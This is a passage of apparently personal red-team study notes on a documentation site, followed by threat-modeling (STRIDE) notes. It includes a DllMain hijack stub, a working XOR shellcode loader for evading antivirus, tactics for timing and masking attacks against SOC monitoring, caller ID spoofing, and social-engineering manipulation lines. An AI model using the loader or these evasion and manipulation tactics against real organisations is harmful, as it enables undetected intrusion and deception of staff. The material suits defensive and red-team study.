<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;This string will be written to the console when this DLL is imported</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="k">break</span><span class="p">;</span> 
<span class="p">}</span>
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
<li>Registry checks<ul>
<li>AlwaysInstallElevated</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>CallerID<ul>
<li>VoIP vendors that allow outbound calling globally for low rates</li>
<li>critically—the option to set your own Caller ID and SMS number (CallWithUs)</li>
</ul>
</li>
</ul>
</li>
<li>Detection and the Security Operations Center<ul>
<li>IDS<ul>
<li>Network Intrusion Detection System (NIDS)<ul>
<li>passive sniffing interfaces</li>
<li>data directly from the switch (span, tap, or mirror port)</li>
<li>don’t hose network’s core bandwidth</li>
</ul>
</li>
<li>Host-based Intrusion Detection System (HIDS)<ul>
<li>problems on end-points</li>
<li>file integrity monitoring, rootkit checks, and Windows Registry checks.</li>
</ul>
</li>
<li>IDS<ul>
<li>monitors network traffic for malicious behavior, system log messages, and user activity.</li>
</ul>
</li>
<li><img alt="" src="../_assets/2020-08-15-18-58-14.png" /></li>
</ul>
</li>
<li>IDS Evasion<ul>
<li>AlienVault trial can be used to test</li>
<li>understand its OTX (Open Threat eXchange) integration</li>
<li><code>EventRisk = (AssetValue × EventPriority × EventReliability) / 25</code></li>
<li>asset with a low value and priority with a rule that is not considered to be sufficiently reliable is not going to get flagged</li>
<li>aim to compromise endpoints that are going to have the lowest asset value (printer)</li>
<li>Cisco router will likely be considered a high-value asset but monitoring usually has to be carefully tuned to avoid excess false positives</li>
<li>A light port scan coming from a Cisco device will likely not be flagged or be immediately closed by the SOC team</li>
<li>TCL scripting language in Cisco devices can be used to script an attack</li>
</ul>
</li>
<li>Security Operations Center (SOC) <ul>
<li>these are the people you have to beat in an APT modeling exercise</li>
<li>Team:<ul>
<li><strong>Shift manager</strong> — Responsible for handovers between shifts and associated duties (briefing status)</li>
<li><strong>First line SOC analysts</strong> — Working in shifts 24/7 monitoring the SIEM<ul>
<li>attack is detected, a ticket is raised and passed to the second line analysts</li>
</ul>
</li>
<li><strong>Second line SOC analysts</strong> — Also available 24/7, although not necessarily on site<ul>
<li>determine if the ticket is a false positive or needs to be escalated to the third line analysts</li>
</ul>
</li>
<li><strong>Third line SOC analysts</strong> — Technically available 24/7 depending on the nature of the incident<ul>
<li>serious ongoing security incident or “active shooter” scenario</li>
</ul>
</li>
</ul>
</li>
<li>final hour of a shift change in the early hours of the morning (3-4am) will likely be the time when the SOC reaction time is at its slowest</li>
<li>Disrupt: <ul>
<li>Stage an attack on a different part</li>
<li>Vulnerability scanners and brute force authentication attacks from multiple IPs</li>
<li>Aim to put as many tickets between you and your attack</li>
</ul>
</li>
</ul>
</li>
<li>AV Evading<ul>
<li>x86/shikata_ga_nai and XORing it with a simple key and use loader:
  <div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">b</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="cm">/* your XORd with key of &#39;xyz&#39; shellcode goes here*/</span><span class="p">};</span> <span class="kt">char</span> <span class="n">c</span><span class="p">[</span><span class="k">sizeof</span> <span class="n">b</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span> <span class="n">b</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="sc">&#39;x&#39;</span><span class="p">;}</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">c</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_</span> <span class="n">READWRITE</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">c</span><span class="p">);</span>
  <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
<span class="p">}</span>
</code></pre></div></li>
<li>In agent code don't use  words like <code>Base64Decode</code> (book uses <code>monkey</code> instead)</li>
<li>Veil Evasion</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Social Engineering <ul>
<li>Fuzzy Fact (hand writing of name is not clesr, hence ask for help)</li>
<li>Psychic Credit <ul>
<li>credit them with knowledge or experience they don’t have</li>
<li>treating the target as an equal and according them the respect of a peer</li>
<li>"I’m normally not used to dealing with people who know what they’re talking about—this is a nice change!"</li>
<li>"You’re the expert so I was wondering if you could tell me...."</li>
</ul>
</li>
<li>The Rainbow Ruse<ul>
<li>statement that credits the client with both a personality trait and its opposite</li>
<li>irrefutable statement and that’s social engineering gold</li>
</ul>
</li>
<li>Flattery / praising the concern / <ul>
<li>similar to the psychic credit, but is broader in its approach (“You’re warm and loving.”)</li>
<li>“I have to say I think your adherence to the essence of what security really is is spot on. Getting the balance right between functional process and security is never easy, but I think you’ve really judged it well—probably a bit better than most companies in your sector. At least in my experience.”</li>
</ul>
</li>
<li>The Jacques Statement</li>
<li>The Barnum Statement<ul>
<li>“something to please everybody.”</li>
<li>Statement is one that is designed to ring true to everyone</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="threat-modeling-designing-for-security">Threat Modeling Designing for Security<a class="headerlink" href="#threat-modeling-designing-for-security" title="Permanent link">&para;</a></h3>
<ul>
<li>Threat modeling is the use of abstractions to aid in thinking about risks.<ul>
<li>Without threat models, you can never stop playing whack-a-mole</li>
<li>Threat modeling should focus on issues that other techniques can’t find</li>
<li>“Think Like an Attacker” Considered Harmful<ul>
<li>thinking like a professional chef: Even if you’re a great home cook, a restaurant-managing chef has to wrestle with problems that a home cook does not.</li>
<li>you may end up with implicit or incorrect assumptions about how an attacker will think</li>
<li>may lead you to focus on the wrong threats</li>
</ul>
</li>
</ul>
</li>
<li>Reasons to Threat Model<ul>
<li>Find Security Bugs Early</li>
<li>Understand Your Security Requirements</li>
<li>Engineer and Deliver Better Products</li>
<li>Address Issues Other Techniques Won’t<ul>
<li>errors of omission (no code analysis tool will find)</li>
<li>issues unique to your design</li>
</ul>
</li>
</ul>
</li>
<li>Four step framework <ul>
<li>Model System - What are you building?<ul>
<li>Show trust boundaries <ul>
<li>Accounts (UIDs on unix systems, or SIDS on Windows)</li>
<li>Network interfaces</li>
<li>Different physical computers</li>
<li>Virtual machines</li>
<li>Organizational boundaries</li>
<li>Almost anywhere you can argue for different privileges</li>
</ul>
</li>
</ul>
</li>
<li>Find Threats - What can go wrong with it once it’s built?<ul>
<li><strong>Spoofing</strong> - pretending to be something or someone you’re not.<ul>
<li>Someone might pretend to be another customer -&gt; authenticate users</li>
<li>Someone might also pretend to be your website -&gt; SSL certificate and single domain</li>
</ul>
</li>
<li><strong>Tampering</strong> - modifying something you’re not supposed to modify.<ul>
<li>Data tampering at backend</li>
<li>Data tampering during transit </li>
<li>Someone deploy code thinking it's dev-env</li>
<li>Angry programmer adding a discount code</li>
</ul>
</li>
<li><strong>Repudiation</strong> - claiming you didn’t do something (regardless of whether you did or not).<ul>
<li>Logs and log tampering prevention</li>
</ul>
</li>
<li><strong>Information Disclosure</strong> - exposing information to people who are not authorized to see it.<ul>
<li>Can anyone connect to DB</li>
<li>What happens if someone connect to DB </li>
</ul>
</li>
<li><strong>Denial of Service</strong> - attacks designed to prevent a system from providing service<ul>
<li>What happens if 1000s of request come at same time</li>
</ul>
</li>
<li><strong>Elevation of Privilege</strong> - program or user is able to do things that they’re not supposed to do.<ul>
<li>What prevents users from connecting directly to the backend</li>
<li>What controls access to DB </li>
</ul>
</li>
</ul>
</li>
<li>Address Threats - What should you do about those things that can go wrong?<ul>
<li>Mitigating threats - doing things to make it harder to take advantage of a threat</li>
<li>Eliminating threats - almost always achieved by eliminating features</li>
<li>Transferring threats - letting someone or something else handle the risk</li>
<li>Accepting the risk</li>
</ul>
</li>
<li>Validate - Did you do a decent job of analysis?</li>
</ul>
</li>
<li>Identifying Threats<ul>
<li>Start with external entities</li>
<li>Never ignore a threat because it’s not what you’re looking for right now</li>
<li>Focus on feasible threats</li>
</ul>
</li>
</ul>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../apt/" title="APT" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                APT
              </span>
            </div>
          </a>
        
        
          <a href="../bug-hunting/" title="Bug hunting" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Bug hunting
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.39abc4af.js"></script>
      
      <script>app.initialize({version:"1.1.2",url:{base:".."}})</script>
      
    
  </body>
</html>